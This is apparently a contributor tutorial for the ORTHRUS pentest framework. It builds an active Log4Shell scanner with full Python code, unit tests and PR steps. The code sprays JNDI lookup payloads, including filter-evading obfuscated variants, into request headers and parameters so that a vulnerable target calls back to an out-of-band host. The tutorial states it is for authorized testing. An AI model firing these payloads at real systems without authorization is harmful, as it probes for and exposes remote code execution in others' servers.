# Your first scanner in 15 minutes

This tutorial walks you from an empty file to a **registered, tested Log4Shell
(CVE-2021-44228 / JNDI injection) scanner** in ORTHRUS. Every class, method, and
import below matches the real codebase — you can copy-paste it and it will run.

By the end you'll have:

- `orthrus/scanners/log4shell.py` — the scanner
- one line in `orthrus/scanners/__init__.py` — the registration hook
- `tests/unit/test_log4shell.py` — a pure unit test
- a green `ruff` + `pytest` run and a PR-ready branch

> **Authorized use only.** ORTHRUS sends real attack payloads. Only run it against
> systems you own or are explicitly authorized to test. See
> [`CONTRIBUTING.md`](../CONTRIBUTING.md).

---

## 1. What a scanner *is* in ORTHRUS

A scanner is a subclass of [`BaseScanner`](../orthrus/scanners/base_scanner.py)
that implements one async-generator method:

```python
async def scan(self, ctx: ScanContext) -> AsyncIterator[Finding]:
    ...
    yield Finding(...)
```

- It receives a single [`ScanContext`](../orthrus/core/context.py) — the shared,
  wired-up per-scan state. The pieces you'll use:
  - `ctx.endpoints` — the discovered `Endpoint` inventory (URLs + their params).
  - `ctx.http` — the **scope-enforced** async HTTP client. Every request routed
    through it is checked against the engagement scope *before* it leaves. Never
    use raw `httpx`; that's how the safety boundary stays load-bearing.
  - `ctx.callback` — the out-of-band (OOB) collaborator, or `None`. This is the
    heart of blind-vuln detection (see below).
  - `ctx.config.aggressiveness` — the operator's intensity dial.
  - `ctx.store` — persistence; we record callback hits here.
- It **yields** [`Finding`](../orthrus/core/schemas.py) objects (pydantic models).
  A scanner is a generator, so it can stream findings as it goes.

Three class attributes describe the scanner to the orchestrator:

| attribute | type | meaning |
|---|---|---|
| `name` | `str` | unique key in the registry (what `--modules` selects) |
| `vuln_type` | `str` | the finding class it reports (e.g. `"log4shell"`) |
| `min_aggressiveness` | `Aggressiveness` | the lowest intensity at which it runs |

### The confirm-don't-just-flag doctrine

ORTHRUS separates **detection** from **confirmation**:

- A **scanner** (`orthrus/scanners/`) *detects* and emits a `Finding`. The
  strongest confidence a scanner sets is `Confidence.FIRM` —
  `Confidence.CONFIRMED` is reserved for the exploitation phase.
- A **confirmer** (`orthrus/exploits/`, subclass of
  [`BaseExploit`](../orthrus/exploits/base_exploit.py)) takes that `Finding` and
  *re-proves* it non-destructively, returning an `ExploitResult`.

Log4Shell is a textbook case for this split. Detection fires when a
`${jndi:ldap://…}` string we injected causes the target to call back. A dedicated
confirmer would then re-prove it with a *fresh* callback token (exactly like
[`orthrus/exploits/ssrf_confirm.py`](../orthrus/exploits/ssrf_confirm.py) does for
SSRF). We build the scanner here and point you at the confirmer in
[§8 Next steps](#8-next-steps).

> Log4Shell is also matched **passively** today: the version-fingerprint scanner
> [`product_cve.py`](../orthrus/scanners/product_cve.py) already carries
> `KnownCve("CVE-2021-44228", 10.0, "Log4Shell — log4j2 JNDI lookup RCE")`. That
> flags *vulnerable-looking versions*; the scanner you're about to write actively
> **proves exploitability**. They complement each other.

---

## 2. The Log4Shell shape

Log4Shell is **blind and out-of-band**. When a vulnerable log4j2 logs
attacker-controlled text containing `${jndi:ldap://attacker/x}`, it *resolves and
fetches* that JNDI reference — reaching out to the attacker's server. There is no
tell in the HTTP response. So detection is purely the callback:

1. Mint a unique callback token per probe (`ctx.callback.new_token()`).
2. Seed a `${jndi:ldap://<callback>/<token>}` string into the sinks log4j most
   often logs: **request headers** (`User-Agent`, `Referer`, `X-Api-Version`, …)
   and **request parameters** (query / body / JSON / path).
3. Wait, then **poll** the collaborator for a hit on that token.

> **Callback backends.** With an Interactsh collaborator (`orthrus scan
> --callback …`), JNDI's *DNS resolution alone* of the unique subdomain registers
> the hit, so `ldap://`, `rmi://`, and `dns://` variants all work. The bundled
> local HTTP listener only sees HTTP callbacks, so run Log4Shell against an
> Interactsh server for full coverage. The scanner code below is agnostic — it
> just calls the [`CallbackClient`](../orthrus/core/callback.py) interface.

The closest existing templates are the OOB paths in
[`cmd_injection.py`](../orthrus/scanners/cmd_injection.py) (`_oob_based`) and
[`ssrf.py`](../orthrus/scanners/ssrf.py). We follow the same pattern.

---

## 3. Create the scanner file

Create **`orthrus/scanners/log4shell.py`**. We'll build it in three pieces:
pure payload helpers, then the class.

### 3a. Imports and constants

```python
"""Log4Shell / JNDI-injection scanner (CVE-2021-44228).

Blind and out-of-band by nature: a vulnerable log4j2 evaluates a
``${jndi:ldap://…}`` lookup it finds in *logged* attacker input (a header, a
query/body value) and reaches out to the attacker's server. There is no response
signal, so detection is purely the callback — seed a per-probe token into the
classic header and parameter sinks, then poll the OOB collaborator for a hit.
Pairs with an ``orthrus/exploits`` confirmer that re-proves it with a fresh token.
"""

from __future__ import annotations

import asyncio
from collections.abc import AsyncIterator
from dataclasses import dataclass
from urllib.parse import urlsplit

import httpx

from orthrus.core.callback import Interaction
from orthrus.core.context import ScanContext
from orthrus.core.schemas import (
    Aggressiveness,
    Confidence,
    Evidence,
    Finding,
    ParamLocation,
    Severity,
)
from orthrus.scanners._injection import injection_points, send, used_url
from orthrus.scanners.base_scanner import BaseScanner
from orthrus.scanners.registry import register
from orthrus.utils.logger import get_logger
from orthrus.utils.scope import ScopeViolation

logger = get_logger("scanner.log4shell")

SCANNER_NAME = "log4shell"
MAX_ENDPOINTS = 60          # cap header probes (one per unique endpoint)
MAX_POINTS = 60             # cap parameter probes
POLL_DELAY = 3.0            # seconds to wait before polling the collaborator

# Request headers a server most often passes verbatim into a log line — the
# classic Log4Shell sinks. We seed them together so one request covers them all.
JNDI_HEADERS = (
    "User-Agent",
    "Referer",
    "X-Api-Version",
    "X-Forwarded-For",
    "X-Client-IP",
    "True-Client-IP",
    "Origin",
)
```

The `_injection` helpers do a lot of heavy lifting for us:
[`injection_points(ctx)`](../orthrus/scanners/_injection.py) enumerates every
`(method, path, location, param)` injectable across the inventory, `send(ctx,
point, value)` places a payload in the right spot (query / body / JSON / path)
and dispatches it through `ctx.http`, and `used_url(point, value)` renders the
URL a probe targeted — all scope-checked.

### 3b. Pure payload builders (unit-testable, no network)

Keep detection logic as pure functions where you can — they test without a socket.

```python
def callback_authority(callback_url: str) -> str:
    """The ``host[:port]`` a JNDI/LDAP lookup should target, from a callback URL.

    ``new_token()`` hands back an HTTP(S) URL; JNDI wants a bare authority. With
    an Interactsh collaborator the token *is* the unique subdomain, so resolving
    that host is itself the OOB hit.
    """
    return urlsplit(callback_url).netloc or callback_url


def jndi_payloads(authority: str, token: str) -> list[str]:
    """Detection-grade ``${jndi:…}`` lookup strings pointing at the callback.

    A small, high-signal set: the lookup schemes log4j2 will follow, plus two
    nested-lookup obfuscations that slip past naive ``${jndi:`` string filters.
    """
    target = f"{authority}/{token}"
    return [
        f"${{jndi:ldap://{target}}}",
        f"${{jndi:rmi://{target}}}",
        f"${{jndi:dns://{target}}}",
        # ${${lower:j}ndi:${lower:l}dap://…}  — case-folding lookup obfuscation
        f"${{${{lower:j}}ndi:${{lower:l}}dap://{target}}}",
        # ${${::-j}${::-n}${::-d}${::-i}:ldap://…}  — default-value spelling of "jndi"
        f"${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:ldap://{target}}}",
    ]
```

### 3c. The scanner class

```python
@dataclass
class _Probe:
    """A payload we sent and the token to poll for its callback."""

    token: str
    url: str
    vector: str                       # human label, e.g. "a request header"
    parameter: str | None = None
    location: ParamLocation | None = None


def _finding(probe: _Probe, hit: Interaction) -> Finding:
    return Finding(
        vuln_type="log4shell",
        title=f"Log4Shell / JNDI injection (CVE-2021-44228) via {probe.vector}",
        severity=Severity.CRITICAL,
        confidence=Confidence.FIRM,
        url=probe.url,
        parameter=probe.parameter,
        param_location=probe.location,
        description=(
            f"A ${{jndi:ldap://…}} lookup placed in {probe.vector} triggered an out-of-band "
            f"{hit.protocol.upper()} callback from {hit.source_ip}. The target logged attacker "
            "input through a JNDI-enabled log4j2 sink (CVE-2021-44228) and performed the "
            "attacker-controlled lookup — this is unauthenticated remote code execution."
        ),
        remediation=(
            "Upgrade log4j2 to 2.17.1+ (or the patched build for your major line). As interim "
            "mitigation set log4j2.formatMsgNoLookups=true or remove the JndiLookup class, and "
            "block outbound LDAP/RMI/DNS egress from application servers."
        ),
        cwe="CWE-917",
        scanner=SCANNER_NAME,
        evidence=Evidence(
            request_raw=f"{probe.vector} = ${{jndi:ldap://<callback>/{probe.token}}}",
            notes=f"OOB {hit.protocol} callback from {hit.source_ip} (token {probe.token})",
            matched_at=hit.source_ip,
        ),
    )


@register
class Log4ShellScanner(BaseScanner):
    name = SCANNER_NAME
    vuln_type = "log4shell"
    min_aggressiveness = Aggressiveness.NORMAL   # active injection

    async def scan(self, ctx: ScanContext) -> AsyncIterator[Finding]:
        # Log4Shell is blind: with no OOB collaborator there is nothing to observe.
        if ctx.callback is None:
            logger.debug("log4shell: no callback server; detection skipped")
            return

        probes = await self._seed_headers(ctx)
        probes += await self._seed_params(ctx)
        if not probes:
            return

        # Give the target time to resolve/connect back before polling.
        await asyncio.sleep(POLL_DELAY)

        for probe in probes:
            interactions = await ctx.callback.poll(probe.token)
            if not interactions:
                continue
            hit = interactions[0]
            store = getattr(ctx, "store", None)
            if store is not None:
                await store.add_callback(
                    probe.token,
                    hit.protocol,
                    hit.source_ip,
                    {"path": hit.path, "method": hit.method},
                )
            yield _finding(probe, hit)

    async def _seed_headers(self, ctx: ScanContext) -> list[_Probe]:
        """Inject a JNDI lookup into the classic header sinks, one token per endpoint."""
        probes: list[_Probe] = []
        seen: set[tuple[str, str]] = set()
        for ep in ctx.endpoints:
            if len(probes) >= MAX_ENDPOINTS:
                break
            key = (ep.method.value, ep.url)
            if key in seen:
                continue
            seen.add(key)
            token, cb_url = ctx.callback.new_token()
            authority = callback_authority(cb_url)
            sent = False
            for payload in jndi_payloads(authority, token):
                headers = {name: payload for name in JNDI_HEADERS}
                try:
                    await ctx.http.request(ep.method.value, ep.url, headers=headers)
                    sent = True
                except (ScopeViolation, httpx.HTTPError, httpx.InvalidURL):
                    continue
            if sent:
                probes.append(_Probe(token=token, url=ep.url, vector="a request header"))
        return probes

    async def _seed_params(self, ctx: ScanContext) -> list[_Probe]:
        """Inject a JNDI lookup into query/body/JSON/path params, one token per point."""
        probes: list[_Probe] = []
        for point in injection_points(ctx):
            if len(probes) >= MAX_POINTS:
                break
            token, cb_url = ctx.callback.new_token()
            authority = callback_authority(cb_url)
            payloads = jndi_payloads(authority, token)
            sent = False
            for payload in payloads:
                if await send(ctx, point, payload) is not None:
                    sent = True
            if sent:
                probes.append(
                    _Probe(
                        token=token,
                        url=used_url(point, payloads[0]),
                        vector=f"parameter '{point.param}'",
                        parameter=point.param,
                        location=point.location,
                    )
                )
        return probes


__all__ = ["Log4ShellScanner", "callback_authority", "jndi_payloads", "JNDI_HEADERS"]
```

**What's going on:**

- We seed **headers** by calling `ctx.http.request(method, url, headers=…)`
  directly — the scope-enforced client supports a `headers` keyword (same call
  [`host_header_confirm.py`](../orthrus/exploits/host_header_confirm.py) uses).
- We seed **parameters** with the shared `send()` helper, mirroring
  `cmd_injection._oob_based`.
- One `token` per probe means a callback hit maps back to the exact
  header/parameter that carried it.
- We record the hit via `ctx.store.add_callback(...)` before yielding — the same
  bookkeeping SSRF and command-injection do.
- The finding is `CRITICAL` / `FIRM` with `cwe="CWE-917"` (Expression-Language /
  JNDI injection, NVD's primary CWE for CVE-2021-44228).

---

## 4. Register it

Registration is the `@register` decorator (already on the class) **plus** an
import so the decorator actually runs. Add `log4shell` to the alphabetized import
block in [`orthrus/scanners/__init__.py`](../orthrus/scanners/__init__.py):

```python
from orthrus.scanners import (  # noqa: F401  (registration side-effects)
    ...
    llm,
    log4shell,          # <-- add this line
    mass_assignment,
    ...
)
```

The [`@register`](../orthrus/scanners/registry.py) decorator keys the class into
`SCANNER_REGISTRY` by its `name`. That's the whole mechanism — no entry points,
no config. Verify it's discoverable:

```bash
orthrus modules log4shell        # shows the scanner's name / vuln_type / gate
orthrus scan --modules log4shell --callback <interactsh-server> https://target
```

(`--modules` matches on either the scanner `name` or its `vuln_type`.)

---

## 5. Write the test

ORTHRUS tests are **pure unit tests**: fake the callback and the HTTP layer, drive
the generator, assert on the findings. Mirror the style of
[`tests/unit/test_cmd_injection.py`](../tests/unit/test_cmd_injection.py).

Create **`tests/unit/test_log4shell.py`**:

```python
"""Tests for the Log4Shell / JNDI-injection scanner (payloads + out-of-band flow)."""

from __future__ import annotations

import re
from types import SimpleNamespace

from orthrus.core.schemas import Endpoint, HttpMethod, Param, ParamLocation
from orthrus.scanners import log4shell as l4s
from orthrus.scanners.log4shell import Log4ShellScanner, callback_authority, jndi_payloads


# --------------------------------------------------------------- payload builders
def test_callback_authority_strips_scheme():
    assert callback_authority("https://abc123.oast.fun") == "abc123.oast.fun"
    assert callback_authority("http://127.0.0.1:8000/tok") == "127.0.0.1:8000"


def test_jndi_payloads_carry_target_and_obfuscation():
    payloads = jndi_payloads("abc.oast.fun", "tok1")
    joined = "\n".join(payloads)
    assert "abc.oast.fun/tok1" in joined
    assert any(p.startswith("${jndi:ldap://") for p in payloads)
    # at least one WAF-bypass / nested-lookup obfuscation variant
    assert any("lower:j" in p or "${::-j}" in p for p in payloads)


# ------------------------------------------------------------------- OOB scan flow
class _Resp:
    status_code = 200
    text = "ok"


class _Interaction:
    protocol = "dns"
    source_ip = "203.0.113.7"
    method = "A"
    path = "abc.oast.fun"


class _FakeCallback:
    """Hands out tokens; records a hit when a payload carrying that token is sent."""

    def __init__(self) -> None:
        self._n = 0
        self.hits: dict[str, list[_Interaction]] = {}

    def new_token(self) -> tuple[str, str]:
        self._n += 1
        tok = f"tok{self._n}"
        return tok, f"https://{tok}.oast.fun"

    def mark(self, token: str) -> None:
        self.hits.setdefault(token, [_Interaction()])

    async def poll(self, token: str) -> list[_Interaction]:
        return self.hits.get(token, [])


class _FakeStore:
    async def add_callback(self, *a: object, **k: object) -> int:
        return 1


def _tokens_in(text: str) -> list[str]:
    return re.findall(r"tok\d+", text)


def _ctx(cb: _FakeCallback, ep: Endpoint) -> SimpleNamespace:
    async def fake_request(method, url, *, headers=None, **kw):  # noqa: ANN001
        # Simulate a vulnerable server that logs a header value through log4j2.
        for value in (headers or {}).values():
            for tok in _tokens_in(value):
                cb.mark(tok)
        return _Resp()

    return SimpleNamespace(
        endpoints=[ep],
        http=SimpleNamespace(request=fake_request),
        scope=SimpleNamespace(is_allowed=lambda _u: True),
        config=SimpleNamespace(aggressiveness="normal"),
        callback=cb,
        store=_FakeStore(),
    )


async def test_oob_confirms_log4shell(monkeypatch):
    cb = _FakeCallback()

    async def fake_send(ctx, point, payload):  # noqa: ANN001
        # Simulate the JNDI lookup firing from an injected parameter value.
        for tok in _tokens_in(payload):
            cb.mark(tok)
        return _Resp()

    monkeypatch.setattr(l4s, "send", fake_send)
    monkeypatch.setattr(l4s.asyncio, "sleep", lambda _s: _noop())

    ep = Endpoint(
        url="http://h/search?q=x",
        method=HttpMethod.GET,
        params=[Param(name="q", location=ParamLocation.QUERY, value="x")],
    )
    findings = [f async for f in Log4ShellScanner().scan(_ctx(cb, ep))]

    assert findings
    assert all(f.vuln_type == "log4shell" for f in findings)
    assert all(f.cwe == "CWE-917" for f in findings)
    assert findings[0].evidence.matched_at == "203.0.113.7"
    # both sinks fire: the header vector and the 'q' parameter vector
    assert any(f.parameter is None for f in findings)         # header probe
    assert any(f.parameter == "q" for f in findings)          # parameter probe


async def test_no_findings_without_callback():
    ep = Endpoint(
        url="http://h/search?q=x",
        method=HttpMethod.GET,
        params=[Param(name="q", location=ParamLocation.QUERY, value="x")],
    )
    ctx = SimpleNamespace(
        endpoints=[ep],
        http=SimpleNamespace(),
        scope=SimpleNamespace(is_allowed=lambda _u: True),
        config=SimpleNamespace(aggressiveness="normal"),
        callback=None,
        store=None,
    )
    assert [f async for f in Log4ShellScanner().scan(ctx)] == []


async def _noop() -> None:
    return None
```

A few things worth calling out:

- **No `@pytest.mark.asyncio`.** The repo sets `asyncio_mode = "auto"`
  (`pyproject.toml`), so plain `async def test_…` is collected and run.
- **`monkeypatch.setattr(l4s, "send", fake_send)`** swaps the module-level `send`
  the scanner imported, so no real socket is opened. `l4s.asyncio.sleep` is
  patched out so the 3-second poll delay doesn't slow the suite.
- `injection_points()` and `used_url()` run for real against the `Endpoint` — they
  need no network, which is exactly why the injection plumbing lives in pure
  helpers.

> **Integration target (optional but encouraged).** For an active scanner,
> `CONTRIBUTING.md` asks for a matching vulnerable route in
> [`tests/integration/reflecting_target.py`](../tests/integration/reflecting_target.py).
> A faithful Log4Shell route needs a JNDI-logging sink *and* a live callback, so
> the pure unit test above is the primary gate here; add an integration route if
> you wire up an end-to-end OOB fixture.

---

## 6. Run the quality gates

CI runs exactly two checks — run them locally before opening a PR:

```bash
ruff check orthrus tests      # E,F,I,UP,B,ASYNC · line-length 100
pytest -q                     # whole suite must pass
```

To iterate on just your new test while developing:

```bash
pytest tests/unit/test_log4shell.py -q
```

There is **no mypy gate**. Keep the tree `ruff`-clean and the suite green; a PR
that breaks either won't merge.

---

## 7. Open the PR

```bash
git checkout -b feat/log4shell-scanner
git add orthrus/scanners/log4shell.py orthrus/scanners/__init__.py tests/unit/test_log4shell.py
git commit -m "feat(scanners): add active Log4Shell (CVE-2021-44228) OOB scanner"
git push -u origin feat/log4shell-scanner
gh pr create --fill        # or open the PR on GitHub
```

PR conventions (from `CONTRIBUTING.md`):

- Branch off `main`, keep the PR focused.
- **Conventional Commits** (`feat:`, `fix:`, `docs:` …).
- Describe *what* and *why*; include the tests (done).
- If you added a new `vuln_type` (we did — `log4shell`), consider a remediation
  entry in [`orthrus/reporting/patches.py`](../orthrus/reporting/patches.py) and
  update any scanner counts in `README.md` / `docs/PRD.md`.
- Follow the **red / white / black** palette rule for any report/UI surface
  (`orthrus/utils/palette.py`) — not relevant to this scanner, but it's the house
  style.

---

## 8. Next steps

**Write the confirmer.** Detection yields `Confidence.FIRM`; confirmation earns
`Confidence.CONFIRMED`. Add `orthrus/exploits/log4shell_confirm.py` with a
[`BaseExploit`](../orthrus/exploits/base_exploit.py) subclass:

```python
@register                                  # from orthrus.exploits.registry
class Log4ShellConfirm(BaseExploit):
    name = "log4shell-confirm"
    handles = ("log4shell",)

    async def confirm(self, ctx: ScanContext, finding: Finding) -> ExploitResult:
        # Mint a FRESH callback token, replay the JNDI payload, poll, and return
        # ExploitResult(success=True, ...) on a hit — never emit the callback data
        # beyond proof. See ssrf_confirm.py for the exact shape.
        ...
```

Register it by adding `log4shell_confirm` to the import block in
[`orthrus/exploits/__init__.py`](../orthrus/exploits/__init__.py). The
orchestrator routes a finding to every confirmer whose `handles` contains the
finding's `vuln_type`. [`ssrf_confirm.py`](../orthrus/exploits/ssrf_confirm.py) is
a near-exact template (OOB replay via the `_replay` helpers `send_value` /
`format_request`).

**Understand the aggressiveness gate.** We set `min_aggressiveness =
Aggressiveness.NORMAL`. The orchestrator ranks the scanner against
`ctx.config.aggressiveness` and **skips** any scanner whose minimum outranks the
configured level. So at `--aggressiveness passive` this scanner is skipped
(it sends live attack payloads); at `normal` (the default) and `aggressive` it
runs. Choose the gate by blast radius: passive/read-only analysis → `PASSIVE`;
payload injection → `NORMAL`; intrusive or state-changing probes → `AGGRESSIVE`
(see `file_upload.py`, `race_condition.py`).

That's the whole loop: **detect → register → test → gate → confirm.** Welcome to
ORTHRUS.
```
